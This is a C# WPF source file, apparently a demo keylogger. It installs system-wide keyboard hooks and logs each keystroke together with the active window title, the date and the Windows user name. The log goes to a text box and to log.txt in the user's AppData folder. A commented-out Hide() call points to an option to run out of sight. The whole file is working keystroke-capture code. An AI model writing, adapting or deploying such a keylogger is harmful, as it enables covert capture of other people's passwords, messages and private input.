using System;
using System.IO;
using System.Windows;
using Logging.complex;

namespace DemoGui
{
    /// <summary>
    ///     Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        private static bool Ctrl, Shift;
        private static string _windowTitle;
        private readonly WindowHook _windowHook;
        public MainWindow()
        {
            //Hide();
            InitializeComponent();

            ComplexLoggingHooks hooks = new ComplexLoggingHooks();
            _windowHook = new WindowHook();

            hooks.KeyDownEvent += HooksOnKeyDownEvent;
            hooks.KeyUpEvent += HooksOnKeyUpEvent;

            hooks.Start();

            WriteToFile($"\n\nDate: {DateTime.Now}  User: {Environment.UserName}\n\n");
        }
        private void HooksOnKeyUpEvent(VKeys key)
        {
            string text;

            switch (key)
            {
                case VKeys.Lcontrol or VKeys.Rcontrol when Ctrl:
                    Ctrl = false;
                    text = $" <{key.ToStringCustom()}>\n";
                    WriteToTextBoxAndFile(text);

                    break;
                case VKeys.Lshift or VKeys.Rshift when Shift:
                    Shift = false;
                    text = $" <{key.ToStringCustom()}>\n";
                    WriteToTextBoxAndFile(text);

                    break;
                case VKeys.Lcontrol or VKeys.Rcontrol when Ctrl:
                case VKeys.Lshift or VKeys.Rshift when Shift:
                    return;
            }
        }
        private void HooksOnKeyDownEvent(VKeys key)
        {
            string text;
            string newWindowTitle = _windowHook.GetWindowText();
            
            if (newWindowTitle != _windowTitle)
            {
                _windowTitle = newWindowTitle;
                text = $" <{_windowTitle}>\n";
                WriteToTextBoxAndFile(text);
            }
            
            switch (key)
            {
                case VKeys.Lcontrol or VKeys.Rcontrol when !Ctrl:
                    Ctrl = true;
                    text = $"\n<{key.ToStringCustom()}>";
                    WriteToTextBoxAndFile(text);

                    return;
                case VKeys.Lshift or VKeys.Rshift when !Shift:
                    Shift = true;
                    text = $"\n<{key.ToStringCustom()}> ";
                    WriteToTextBoxAndFile(text);

                    return;
                case VKeys.Lcontrol or VKeys.Rcontrol when Ctrl:
                case VKeys.Lshift or VKeys.Rshift when Shift:
                    return;
                default:
                    text = $"{key.ToStringCustom()}";
                    WriteToTextBoxAndFile(text);

                    break;
            }
        }

        private void WriteToTextBoxAndFile(string text)
        {
            tb_text.Text += text;
            WriteToFile(text);
        }

        private void WriteToFile(string text)
        {
            string appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string filePath = $"{appDataPath}\\log.txt";

            File.AppendAllText(filePath, text);
        }
    }
}